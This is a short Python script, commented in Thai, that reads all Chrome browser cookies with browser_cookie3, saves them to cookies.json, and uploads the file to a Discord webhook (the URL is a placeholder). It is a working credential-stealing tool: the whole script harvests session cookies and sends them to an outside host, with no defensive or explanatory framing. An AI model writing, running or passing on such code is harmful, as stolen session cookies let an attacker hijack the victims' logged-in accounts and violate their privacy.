import browser_cookie3
import json
import requests

# ดึงคุกกี้จาก Chrome
cookies = browser_cookie3.chrome()

# เปลี่ยนข้อมูลคุกกี้เป็นรูปแบบ JSON
cookies_list = [cookie.__dict__ for cookie in cookies]

# บันทึกคุกกี้ลงในไฟล์ JSON
with open('cookies.json', 'w') as file:
    json.dump(cookies_list, file, indent=4)

print("Cookies have been saved to cookies.json")

# กำหนด Webhook URL
WEBHOOK_URL = 'https://your-discord-webhook-url'

# ส่งไฟล์ JSON ไปยัง Webhook
with open('cookies.json', 'rb') as file:
    response = requests.post(
        WEBHOOK_URL,
        files={'file': ('cookies.json', file, 'application/json')}
    )

# แสดงผลลัพธ์จาก Webhook
print(f'Status Code: {response.status_code}')
print(f'Response: {response.text}')